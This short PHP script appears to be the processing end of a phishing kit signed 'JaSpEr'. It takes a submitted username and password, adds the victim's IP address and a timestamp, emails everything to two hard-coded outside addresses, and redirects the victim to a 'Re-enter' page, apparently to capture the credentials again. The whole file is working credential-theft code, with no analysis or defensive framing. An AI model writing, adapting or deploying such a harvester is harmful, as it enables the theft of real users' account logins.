<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user1 = $_POST['user_id'];
$pass1 = $_POST['password'];
$chaseme="lina0327116@gmail.com,richardsmith292929@yandex.com";


  $subj = "[Portal] JaSpEr $ip";
  $msg = "Doc Info\n\nUsername: $user1\nPassword: $pass1\n$ip $adddate\n-----------------------------------\n        Created By JaSpEr\n-----------------------------------";
  $from = "From: <Portal>";
  mail("$chaseme", $subj, $msg, $from);
  header("Location: Re-enter.php");